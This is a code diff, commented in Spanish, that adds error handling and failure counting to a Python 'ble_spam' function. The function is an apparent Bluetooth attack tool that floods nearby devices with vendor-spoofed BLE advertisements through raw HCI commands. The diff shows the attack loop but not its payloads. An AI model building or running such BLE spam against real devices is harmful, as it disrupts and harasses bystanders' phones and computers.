@@ -1283,8 +1283,11 @@ def ble_spam(iface=DEFAULT_IFACE, seconds=20, mode="names", period_s=1.0):
         return None, "hcitool: no se pudo hablar con el controller (sudoers?)"
     time.sleep(0.1)
     # LE Set Advertising Parameters: interval 100ms, non-connectable, 3 ch.
-    _hci(iface, 0x0006, [0xA0, 0x00, 0xA0, 0x00, 0x03, 0x00, 0x00,
-                         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00])
+    r = _hci(iface, 0x0006, [0xA0, 0x00, 0xA0, 0x00, 0x03, 0x00, 0x00,
+                             0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00])
+    if r is None or r.returncode != 0:
+        _hci(iface, 0x000A, [0x00])
+        return None, "hcitool: no pudo configurar el intervalo/canales BLE"
 
     # Pool de payloads segun modo.
     if mode in ("apple", "google", "microsoft", "samsung"):
@@ -1302,6 +1305,7 @@ def ble_spam(iface=DEFAULT_IFACE, seconds=20, mode="names", period_s=1.0):
                 for n in _load_ble_names()]
 
     cycles = 0
+    failed_commands = 0
     uniq_names = set()
     last_name = ""
     t_end = time.time() + seconds
@@ -1311,8 +1315,13 @@ def ble_spam(iface=DEFAULT_IFACE, seconds=20, mode="names", period_s=1.0):
         if not payload:
             continue
         padded = payload + bytes(31 - len(payload))
-        _hci(iface, 0x0008, [len(payload)] + list(padded))
-        _hci(iface, 0x000A, [0x01])
+        r_data = _hci(iface, 0x0008, [len(payload)] + list(padded))
+        r_enable = _hci(iface, 0x000A, [0x01])
+        if (r_data is None or r_data.returncode != 0 or
+                r_enable is None or r_enable.returncode != 0):
+            failed_commands += 1
+            time.sleep(period)
+            continue
         cycles += 1
         n = item.get("name", "")
         if n:
@@ -1324,10 +1333,15 @@ def ble_spam(iface=DEFAULT_IFACE, seconds=20, mode="names", period_s=1.0):
 
     log_bt_attack("ble_spam", "", "ok" if cycles > 0 else "fail",
                   details=f"iface={iface} mode={mode} seconds={seconds} "
-                          f"cycles={cycles} uniq={len(uniq_names)} last={last_name}")
+                          f"cycles={cycles} uniq={len(uniq_names)} "
+                          f"last={last_name} failed_commands={failed_commands}")
+    err = (f"hcitool: {failed_commands} orden(es) HCI rechazadas; "
+           "comprueba sudoers/rfkill/controller"
+           if failed_commands else None)
     return {"iface": iface, "mode": mode, "seconds": seconds,
             "cycles": cycles, "uniq_names": len(uniq_names),
-            "last_name": last_name, "raw": ""}, None
+            "last_name": last_name, "failed_commands": failed_commands,
+            "raw": ""}, err
 
 
 # ---------------------------------------------------------------------------
